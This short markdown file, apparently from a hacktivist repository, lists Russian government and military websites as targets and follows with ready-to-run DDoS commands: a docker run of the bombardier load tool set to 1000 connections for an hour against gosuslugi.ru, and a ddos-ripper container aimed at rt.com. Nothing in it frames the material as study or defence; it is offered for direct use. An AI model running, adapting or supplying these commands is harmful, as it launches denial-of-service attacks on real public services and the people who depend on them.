# List of public russian government and military services

https://www.gosuslugi.ru  
https://epp.genproc.gov.ru  
https://ach.gov.ru  
https://www.scrf.gov.ru  
https://mil.ru  
https://minpromtorg.gov.ru/  
https://favt.gov.ru/  
https://rkn.gov.ru/
https://rg.ru/org/pravitelstvo/minoboroni/gru/

# DDoS commands

```
docker run -ti --rm alpine/bombardier -c 1000 -d 3600s -l https://www.gosuslugi.ru
docker run -it --rm nitupkcuf/ddos-ripper:latest www.rt.com
```
